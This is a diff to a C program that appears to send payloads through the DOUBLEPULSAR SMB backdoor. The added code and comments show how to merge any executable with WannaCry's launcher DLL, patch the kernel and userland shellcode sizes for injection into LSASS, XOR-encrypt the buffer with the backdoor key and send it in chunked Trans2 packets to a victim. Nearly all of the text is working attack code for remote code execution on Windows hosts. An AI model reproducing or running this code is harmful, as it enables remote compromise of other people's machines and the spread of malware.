@@ -5,7 +5,45 @@
 #include <stdlib.h>
 #include <string.h>
 #include <winsock.h>
+#include "Doublepulsar_launcher_dll.h"
 #pragma comment(lib, "ws2_32.lib")
+
+/*
+This program reads in a sample EXE such as Putty.exe and merges it with the Wannacry launcher.dll found in the worm. 
+This DLL is a skeleton that allows us to attach an executable at the end.  
+When loaded, the DLL will extract the EXE resource, write it to disk and run it.
+
+This program then merges the Shellcode with the DLL and executable
+
+It patches the values needed for this to work:
+
+//The size of the DLL + Userland shellcode needed for the kernel shellcode to know how much to copy into the victim process ( LSASS )
+
+Example: Total DLL size ( which includes your EXE ) = 0x50D800 bytes in size
+
+Update that value in the kernel shellcode which also includes the 3978 of userland shellcode
+This instructs the kernel shellcode to tell the OS how much memory to allocate 
+for the DLL & the Userland DLL bootstrap shellcode
+Kernel Shellcode[2158] = 0x50D800 + 3978;
+
+USERLAND SHELLCODE HERE:
+Update the size of the DLL here:
+Kernel Shellcode[2166+0xF82] = 0x50D800; //DLL length
+Kernel Shellcode[2166+0xF86] = 1; //DLL ordinal
+
+Important values to know:
+
+Kernel Shellcode total: 0x1800
+kernel portion of the shellcode (kernel): 2166
+Userland Shellcode size: 3978
+Kernel Shellcode ( 2166 ) + Userland Shellcode ( 3978) = 0x1800 = 6144
+
+Size of Wannacry's launcher DLL: 0xc8a4
+
+BEFORE the XOR encryption, you must include the EXE length after the DLL which is after the kernel shellcode and at the end of the DLL length which 0xc8a4
+the payload buffer is then XOR encrypted with the doublepulsar key and ready to ship.
+
+*/
 
 unsigned char SmbNegociate[] =
 "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
@@ -384,14 +422,6 @@ int main(int argc, char* argv[])
 
 	//copy our returned userID value from the previous packet to the TreeConnect request packet
 	userid = *(WORD*)(recvbuff + 0x20);
-	
-	//output windows version to the screen
-	printf("Remote OS: ");
-	int r;
-	for (r = 0; r < 39; r++) {
-		printf("%c", recvbuff[44 + r]);
-	}
-	printf("\n");
 
 	//Generates a new TreeConnect request with the correct IP address
 	//rather than the hard coded one embedded in the TreeConnect string
@@ -455,8 +485,8 @@ int main(int argc, char* argv[])
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
-	//choose your DLL  here
-	char filename[MAX_PATH] = "D:\\STRIKE\\artifact.dll";
+	//your file path here
+	char filename[MAX_PATH] = "D:\\strike\\putty.exe";
 	printf("Loading file: %s\n", filename);
 	DWORD	dwFileSizeLow = NULL;
 	DWORD	dwFileSizeHigh = NULL;
@@ -474,7 +504,6 @@ int main(int argc, char* argv[])
 	dwFileSizeLow = GetFileSize(hFile, &dwFileSizeHigh);
 	printf("> File Size: %d bytes\n", dwFileSizeLow);
 
-	//alloc memory the size of of the DLL
 	PBYTE pExeBuffer = new BYTE[dwFileSizeLow];
 
 	while (dwDummy)
@@ -486,17 +515,57 @@ int main(int argc, char* argv[])
 
 	CloseHandle(hFile);
 
+
+	//0x50D800 = 5298176
+	DWORD DLLSIZE = 0x50D000;
+	
+	//allocate memory for DLL creation
+	PBYTE DLL = new BYTE[DLLSIZE];
+	memset(DLL, 0x00, DLLSIZE);
+	
+	//copy launcher DLL to buffer
+	memcpy(DLL, launcher_dll, 0xc8a4);
+	hexDump(NULL, (char*)&DLL[0xc8a4], 4);
+	
+	//add the size of the EXE after the DLL
+	*(DWORD*)&DLL[0xc8a4] = dwFileSizeLow;
+	hexDump(NULL, (char*)&DLL[0xc8a4], 4);
+	
+	//copy the EXE to the buffer, after the DWORD size value
+	memcpy(DLL + 0xc8a4 + 4, pExeBuffer, dwFileSizeLow);
+	printf("MZ HEADER EXPECTED:  ");
+	hexDump(NULL, (char*)&DLL[0xc8a4 + 4], 4);
+
+	//write out file here for debug purposes
+	/*
+	HANDLE hWriteFile;
+	DWORD WriteNumberOfBytesToWrite = 0;
+	char szDest[MAX_PATH] = "D:\\STRIKE\\file.dll";
+	hWriteFile = CreateFileA(szDest, 0x40000000, 2, 0, 2, 4, 0);
+	WriteFile(hWriteFile, (PBYTE*)DLL, DLLSIZE, &WriteNumberOfBytesToWrite, NULL);
+	CloseHandle(hWriteFile);
+	*/
+
+
+	DWORD size = DLLSIZE;
+	int difference = size - 4 - dwFileSizeLow;
+	printf("DLL size = %d\n", size);
+	printf("Exe file size:  %d\n", dwFileSizeLow);
+	printf("Difference in bytes:  %d\n", difference);
+
 	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
 	printf("BEFORE:  ");
 	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
-	*(DWORD*)&kernel_rundll_shellcode[2158] = dwFileSizeLow + 3978;
+
+	DWORD value = 5298176 + 3978;
+	*(DWORD*)&kernel_rundll_shellcode[2158] = value; // 5298176 + 3978;
 	printf("AFTER:  ");
 	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 
 	printf("patching DLL size...\n");
 	printf("BEFORE:  ");
 	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
-	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = dwFileSizeLow;
+	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = DLLSIZE;
 	printf("AFTER:  ");
 	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
 	printf("patching DLL ordinal...\n");
@@ -509,8 +578,10 @@ int main(int argc, char* argv[])
 	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
 	kernel_shellcode_size -= 1;
 	printf("Kernel shellcode size:  %d\n", kernel_shellcode_size);
-	int payload_totalsize = kernel_shellcode_size + dwFileSizeLow;
+
+	int payload_totalsize = kernel_shellcode_size + DLLSIZE;
 	PBYTE pFULLBUFFER = new BYTE[payload_totalsize];
+	memset(pFULLBUFFER, 0x00, payload_totalsize);
 
 	int numberofpackets = payload_totalsize / 4096;
 	int iterations = payload_totalsize % 4096;
@@ -518,7 +589,7 @@ int main(int argc, char* argv[])
 	printf("%d as a remainder\n", iterations);
 
 	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
-	memcpy(pFULLBUFFER + 6144, pExeBuffer, dwFileSizeLow);
+	memcpy(pFULLBUFFER + 6144, DLL, DLLSIZE);
 
 	//unsigned int XorKey = 0x58581162;
 	unsigned char byte_xor_key[5];
@@ -537,7 +608,7 @@ int main(int argc, char* argv[])
 	unsigned int bytesLeft = payload_totalsize;
 
 	//for doublepulsar parameters
-	unsigned int TotalSizeOfPayload = payload_totalsize; 
+	unsigned int TotalSizeOfPayload = payload_totalsize;
 	unsigned int ChunkSize = 4096;
 	unsigned int OffsetofChunkinPayload = 0x0000;
 	int ctx;
@@ -566,7 +637,7 @@ int main(int argc, char* argv[])
 			smblen = bytesLeft + 70 + 12 - 4;
 			printf("Last packet size = %d\n", smblen);
 			smb_htons_len = htons(smblen);
-			
+
 			memset(Parametersbuffer, 0x00, 12);
 			memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
 			memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&bytesLeft, 4);
@@ -577,14 +648,14 @@ int main(int argc, char* argv[])
 				Parametersbuffer[i] ^= byte_xor_key[i % 4];
 			}
 
-			hexDump(NULL, Parametersbuffer, 12);
-
+			//hexDump(NULL, Parametersbuffer, 12);
 
 			//copy wannacry skeleton packet to big Trans2 packet
 			memcpy((unsigned char*)last_packet, (unsigned char*)wannacry_Trans2_Request, 70);
 
 			//update size
 			memcpy(last_packet + 2, &smb_htons_len, 2);
+			printf("Last packet SMB len -> ");
 			hexDump(NULL, (char*)last_packet, 4);
 
 			TotalDataCount = bytesLeft;
@@ -630,7 +701,6 @@ int main(int argc, char* argv[])
 			break;
 		}
 
-
 		memset(Parametersbuffer, 0x00, 12);
 		memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
 		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
@@ -641,7 +711,7 @@ int main(int argc, char* argv[])
 			Parametersbuffer[i] ^= byte_xor_key[i % 4];
 		}
 
-		hexDump(NULL, Parametersbuffer, 12);
+		//hexDump(NULL, Parametersbuffer, 12);
 
 		//copy wannacry skeleton packet to big Trans2 packet
 		memcpy((unsigned char*)big_packet, (unsigned char*)wannacry_Trans2_Request, 70);
@@ -681,6 +751,7 @@ int main(int argc, char* argv[])
 
 	delete pExeBuffer;
 	delete pFULLBUFFER;
+	delete DLL;
 	free(big_packet);
 	free(last_packet);
 
@@ -700,7 +771,6 @@ int main(int argc, char* argv[])
 	//send the disconnect packet
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
-
 
 	unsigned char logoff_packet[] =
 		"\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00"
